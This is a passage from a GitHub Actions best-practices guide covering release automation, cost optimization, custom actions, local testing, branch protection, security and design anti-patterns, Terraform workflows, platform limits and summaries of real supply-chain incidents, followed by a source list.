- **GHCR**: Use built-in `GITHUB_TOKEN`.
- **Docker Hub**: Use personal access tokens stored as secrets.
- **AWS ECR**: Use OIDC (preferred) or stored credentials.

### Tagging Strategy

- Git SHA for immutability: `app:abc123def`
- Semantic version from releases: `app:v1.2.3`
- `latest` for convenience (mutable, use with caution)

---

## 25. Release Automation

### Semantic Release

Automated versioning using conventional commits:

```yaml
name: Release
on:
  push:
    branches: [main]
jobs:
  release:
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with:
          node-version: '20'
      - run: npm ci
      - run: npx semantic-release
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### Conventional Commit Patterns

| Prefix | Bump | Example |
|--------|------|---------|
| `fix:` | PATCH (1.0.x) | `fix: resolve null pointer` |
| `feat:` | MINOR (1.x.0) | `feat: add OAuth2 support` |
| `feat!:` / `fix!:` | MAJOR (x.0.0) | `feat!: redesign API` |

### Tag-Based Releases

For non-Node projects:

```yaml
on:
  push:
    tags: ['v*']
```

Use `softprops/action-gh-release` or `gh release create` to create GitHub releases with assets.

---

## 26. Cost Optimization

### Billing Rates (GitHub-Hosted, Per Minute)

| Runner | Rate |
|--------|------|
| Linux x64 (2-core) | $0.008/min |
| Linux ARM64 (2-core) | $0.005/min |
| Windows (2-core) | $0.016/min |
| macOS (3-4 core) | $0.08/min |

macOS is 10x more expensive than Linux. Windows is 2x.

### Free Tier

| Plan | Monthly Minutes | Storage |
|------|----------------|---------|
| Free | 2,000 | 500 MB |
| Pro | 3,000 | 1 GB |
| Team | 3,000 | 2 GB |
| Enterprise | 50,000 | 50 GB |

### Optimization Strategies (Highest to Lowest Impact)

1. **Dependency caching** -- saves 2-5 minutes per job.
2. **Job parallelization** -- cuts total time by 50%+.
3. **Concurrency with cancel-in-progress** -- eliminates wasted runs entirely.
4. **Shallow clones** (`fetch-depth: 1`) -- saves 30 seconds to 2 minutes.
5. **Path-based triggering** -- skips entire workflows for irrelevant changes.
6. **ARM64 runners** -- 37% cheaper than x64 for compatible workloads.
7. **Timeouts** -- prevents runaway jobs from burning minutes.
8. **Smart matrix strategies** -- run full matrix only on merge to main, reduced matrix on PRs.

### Cost Gotchas

- Larger runners are always billed regardless of public/private repository.
- Artifact, cache, and Packages storage share one pooled allowance.
- Cache overage beyond 10 GB costs $0.07/GiB/month.

---

## 27. Custom Actions Development

### Three Types

| Type | Pros | Cons |
|------|------|------|
| JavaScript | Fastest execution, cross-platform | Must bundle dependencies |
| Docker | Isolated environment, consistent | Linux-only, slower startup |
| Composite | No language requirements, mix steps | Limited logging granularity |

### Best Practices

- Public actions: keep in their own repository for independent versioning.
- Internal actions: store in `.github/actions/` alongside workflows.
- Use semantic versioning with major version tags (`v1`, `v2`).
- Use the GitHub Actions Toolkit (`@actions/core`, `@actions/github`).
- Bundle JavaScript dependencies with `ncc`.

---

## 28. Testing Workflows Locally

### nektos/act

`act` runs workflows locally using Docker containers simulating the GitHub runner environment.

### When act IS Useful

- Quick syntax validation.
- Testing shell scripts and step logic.
- Debugging environment variable and conditional logic.
- Faster iteration than push-and-wait cycles.

### When act IS NOT Useful

- Workflows using GitHub API calls, OIDC, artifact upload/download, or caching.
- Workflows with complex permissions or secret requirements.
- Workflows depending on specific runner tool versions.
- Full-fidelity runner images are 18+ GB; default micro images lack many tools.

### Alternatives

- VS Code "GitHub Local Actions" extension.
- Use `workflow_dispatch` with test inputs for rapid iteration on real runners.
- Temporary frequent cron schedule (`*/5 * * * *`) to verify pickup, then revert.

---

## 29. Notifications and Alerting

### Slack Integration

```yaml
- uses: slackapi/slack-github-action@<sha>
  if: failure()
  with:
    webhook: ${{ secrets.SLACK_WEBHOOK_URL }}
    webhook-type: incoming-webhook
    payload: |
      {
        "text": "Deploy to ${{ env.ENVIRONMENT }}: ${{ job.status }}"
      }
```

### Best Practices

- Start with failure-only notifications on critical paths.
- Route to project/team-specific channels.
- Avoid alert fatigue: only notify on actionable events (failures, required approvals, production deploys).
- Use `if: failure()` or `if: always()` to control when alerts fire.

---

## 30. Branch Protection Integration

### Status Check Setup

1. Create workflows triggered on `pull_request` targeting protected branches.
2. Add a `push: branches: [main]` trigger so checks appear in branch protection settings (GitHub only shows checks that have run in the last 7 days).
3. In Settings > Branches > Protection rule, enable "Require status checks to pass" and select your job names.

### Gotchas

- Job names must be unique across all workflows. Duplicates cause ambiguous results that block PRs.
- Reusable workflow status checks use the format `CallerJobName / ReusableJobName`. Set the required check to the full nested name.
- If using `paths:` filters and the workflow doesn't run, the required check never reports. Use a stub job (see section 23).

---

## 31. Anti-Patterns and Common Mistakes

### Security Anti-Patterns

| Anti-Pattern | Risk | Fix |
|-------------|------|-----|
| Pinning actions to tags | Supply chain compromise | Pin to full SHA |
| Using `pull_request_target` with PR checkout | Full secret exfiltration | Use `pull_request` or never checkout PR code |
| Interpolating untrusted input in `run:` | Script injection | Use environment variable indirection |
| Overprivileged `GITHUB_TOKEN` | Excessive blast radius | Explicit minimal `permissions` |
| Self-hosted runners for public repos | Persistent compromise | Use GitHub-hosted or ephemeral runners |
| Storing structured data as secrets | Log redaction bypass | Individual secrets per value |
| Passing secrets as CLI args | Process table exposure | Use environment variables |

### Design Anti-Patterns

| Anti-Pattern | Problem | Fix |
|-------------|---------|-----|
| Monolith workflow | Slow, fragile, hard to debug | Split by concern |
| Copy-paste workflows across repos | Maintenance nightmare | Reusable workflows or composite actions |
| No caching | Slow builds, wasted minutes | Cache dependencies and build outputs |
| No concurrency controls | Wasted parallel runs | Concurrency groups with cancel-in-progress |
| No timeouts | 6-hour default burns minutes | Set `timeout-minutes` on every job |
| Static cache keys | Stale dependencies | Hash lockfiles in cache keys |
| `ubuntu-latest` | Surprise environment changes | Pin runner versions |
| Running full matrix on every PR | Wasted minutes | Full matrix on main only |
| Sensitive ops on untrusted triggers | Secret exposure | Deploy only on `push` to main |

---

## 32. Infrastructure-as-Code Patterns

### Terraform Plan/Apply Separation

Separate plan (PR) and apply (merge) into distinct workflows:

**Plan on PR:**
1. `terraform fmt -check`
2. `terraform validate`
3. Security scanning (`checkov`, `tfsec`)
4. `terraform plan`
5. Post plan output as PR comment

**Apply on merge:**
1. `terraform plan` (verify)
2. `terraform apply`
3. Gated on environment approval

### Dual-Identity Pattern

Use separate service principals for plan (read-only) and apply (write) to prevent contributors from gaining destructive permissions through PR-triggered workflows.

### State Management

- Use concurrency groups for state locking.
- Provision dedicated state backends per project to minimize blast radius.
- Prefer OIDC for cloud authentication over stored credentials.

### Drift Detection

Schedule a periodic workflow to run `terraform plan -detailed-exitcode` and automatically open an issue if drift is detected.

---

## 33. Platform Limitations and Workarounds

### Hard Limits

| Limit | Value |
|-------|-------|
| Job timeout | 6 hours (configurable lower) |
| Workflow run retention | 35 days max |
| Runs queued per 10s per repo | 500 |
| API requests per hour per repo | 1,000 |
| Jobs per workflow | 256 |
| Reusable workflows per file | 20 |
| Nesting depth | 10 levels |
| Cache key length | 512 characters |
| Secret size | 48 KB |

### Notable Limitations

- **No native workflow testing**: no built-in way to validate logic without pushing.
- **No cross-repo orchestration**: use `repository_dispatch` as a workaround.
- **No dynamic `uses`**: the `uses` keyword cannot be an expression.
- **Docker actions are Linux-only**.
- **Composite actions have limited `if` support** on steps (improved in recent updates).
- **Scheduled workflow imprecision**: up to 20 minutes late.
- **Inactive repo disabling**: GitHub disables cron workflows on repos with no recent activity.

### Workarounds

- Dynamic matrices: preceding job outputs JSON for the matrix.
- Cross-repo triggers: `repository_dispatch` with `peter-evans/repository-dispatch`.
- Per-job path filtering: `dorny/paths-filter` (vet carefully after the tj-actions incident).
- Long-running jobs: split into multiple jobs with artifact passing.

---

## 34. Real-World Incidents

### tj-actions/changed-files Supply Chain Attack (March 2025)

**CVE-2025-30066, CVSS 8.6** -- The most significant GitHub Actions security incident to date.

- Attackers compromised the `tj-actions/changed-files` action (one of the most popular on the marketplace).
- Retroactively modified version tags (v1.0.0 through v44.5.1) to point to malicious commits.
- The malicious code scanned runner process memory for secrets, base64-encoded them, and printed them to build logs.
- Over 23,000 repositories affected.
- **Pinning to version tags would NOT have protected you** because the attacker modified existing tags. Only SHA pinning was safe.

### PyTorch Supply Chain Attack

Researchers demonstrated a critical attack using self-hosted runners:

- Gained contributor status via a trivial markdown fix.
- Identified persistent self-hosted runners from workflow logs.
- Installed persistence using a second runner agent registered to their own org.
- Stole tokens controlling 93+ repositories and AWS credentials for the release bucket.

### GitHub Actions Worm Research (Palo Alto Networks)

Demonstrated that a single compromised action could propagate worm-like through the dependency tree via repojacking, potentially infecting thousands of downstream projects.

### Key Lesson

These incidents share a common thread: trust in the supply chain was exploited. The defenses are:

1. Pin to SHAs.
2. Set minimal permissions.
3. Use ephemeral runners.
4. Prefer inline commands over third-party actions for simple operations.
5. Vet and fork critical dependencies.

---

## 35. Sources

### GitHub Official Documentation

- [Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [Using Secrets in GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)
- [Automatic Token Authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)
- [About Security Hardening with OIDC](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [Using GitHub's Security Features for Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-githubs-security-features-to-secure-your-use-of-github-actions)
- [Managing Environments for Deployment](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)
- [Reusing Workflows](https://docs.github.com/en/actions/sharing-automations/reusing-workflows)
- [Workflow Syntax (permissions)](https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#permissions)
- [About Billing for GitHub Actions](https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions)
- [Caching Dependencies](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows)
- [Creating a Docker Container Action](https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action)
- [About Custom Actions](https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions)
- [Control Workflow Concurrency](https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency)

### Security Research and Advisories

- [GitHub Security Lab -- Untrusted Input](https://securitylab.github.com/resources/github-actions-untrusted-input/)
- [GitHub Blog -- Four Tips for Secure Workflows](https://github.blog/security/supply-chain-security/four-tips-to-keep-your-github-actions-workflows-secure/)
- [GitGuardian -- GitHub Actions Security Cheat Sheet](https://blog.gitguardian.com/github-actions-security-cheat-sheet/)
- [Palo Alto Networks -- GitHub Actions Worm Dependencies](https://www.paloaltonetworks.com/blog/prisma-cloud/github-actions-worm-dependencies/)
- [Nathan Davison -- Malicious Pull Requests](https://nathandavison.com/blog/github-actions-and-the-threat-of-malicious-pull-requests)
- [John Stawinski -- PyTorch Supply Chain Attack](https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/)
- [Legit Security -- Artifact Poisoning in Rust](https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust)
- [StepSecurity -- GitHub Actions Security Best Practices](https://www.stepsecurity.io/blog/github-actions-security-best-practices)
- [CVE-2025-30066 (tj-actions/changed-files)](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3)

### Community and Blog Posts

- [Exercism -- GHA Best Practices](https://exercism.org/docs/building/github/gha-best-practices)
- [Datree -- GitHub Actions Best Practices](https://www.datree.io/resources/github-actions-best-practices)
- [OneUptime -- GitHub Actions Performance Optimization](https://oneuptime.com/blog/post/2026-02-02-github-actions-performance-optimization/view)
- [DEV.to -- Composite Actions vs Reusable Workflows](https://dev.to/n3wt0n/composite-actions-vs-reusable-workflows-what-is-the-difference-github-actions-11kd)
- [Incredibuild -- Reusable Workflows Best Practices](https://www.incredibuild.com/blog/best-practices-to-create-reusable-workflows-on-github-actions)
- [Ken Muse -- How to Handle Step and Job Errors](https://www.kenmuse.com/blog/how-to-handle-step-and-job-errors-in-github-actions/)
- [CICube -- GitHub Actions Cache Guide](https://cicube.io/blog/github-actions-cache/)
- [Graphite -- Monorepo with GitHub Actions](https://graphite.dev/guides/monorepo-with-github-actions)
- [HashiCorp -- Automate Terraform with GitHub Actions](https://developer.hashicorp.com/terraform/tutorials/automation/github-actions)
- [Spacelift -- Terraform with GitHub Actions](https://spacelift.io/blog/github-actions-terraform)
- [Docker Docs -- GitHub Actions](https://docs.docker.com/build/ci/github-actions/)
- [GitHub Blog -- Let's Talk About GitHub Actions](https://github.blog/news-insights/product-news/lets-talk-about-github-actions/)
- [nektos/act Documentation](https://nektosact.com/)
- [Depot -- Guide to Debugging GitHub Actions](https://depot.dev/blog/guide-to-debugging-github-actions)
